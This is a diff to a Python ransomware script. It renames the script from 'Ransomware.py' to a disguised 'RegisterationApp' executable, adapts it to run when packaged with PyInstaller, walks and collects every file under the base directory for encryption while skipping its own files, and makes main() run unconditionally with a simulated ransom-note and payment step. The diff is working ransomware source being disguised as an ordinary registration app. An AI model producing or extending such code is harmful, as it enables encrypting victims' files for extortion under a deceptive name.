@@ -10,20 +10,27 @@ from Cryptodome.Cipher import AES
 # Get all files in the current directory and subdirectories
 def get_all_files_in_directory():
     targets = []
-    base_dir = os.path.dirname(os.path.abspath(__file__))
+    base_dir = os.path.dirname(os.path.abspath(sys.executable if getattr(sys, 'frozen', False) else __file__))
 
     while True:
-        if 'Ransomware.py' in os.listdir(base_dir):
+        if 'RegisterationApp.exe' in os.listdir(base_dir) or 'RegisterationApp.py' in os.listdir(base_dir):
             break
         parent_dir = os.path.dirname(base_dir) 
         base_dir = parent_dir
 
+    pyinstaller_temp = os.environ.get('TEMP', '')
+    if '_MEI' in base_dir:
+        print("⚠ Detected PyInstaller temp dir as base — aborting.")
+        return []
+
     for root, dirs, files in os.walk(base_dir):
-        # Modify dirs to skip hidden folders
+        # Skip PyInstaller temp folder if it shows up
+        if '_MEI' in root or pyinstaller_temp in root:
+            continue
         dirs[:] = [d for d in dirs if not d.startswith('.')]
         for file in files:
-            # Exclude my script to avoid locking myself out
-            if file.startswith('.') or file in ['Ransomware.py', 'hash.py']:
+            # Exclude my script to avoid locking myself out or already encrypted files
+            if file.startswith('.') or file in ['RegisterationApp.py', 'RegisterationApp.exe', 'hash.py']:
                 continue
 
             filepath = os.path.join(root, file)
@@ -210,5 +217,4 @@ def main():
         # Simulate the ransom note and payment process
         simulate_payment()
 
-if __name__ == "__main__":
-    main()
+main()
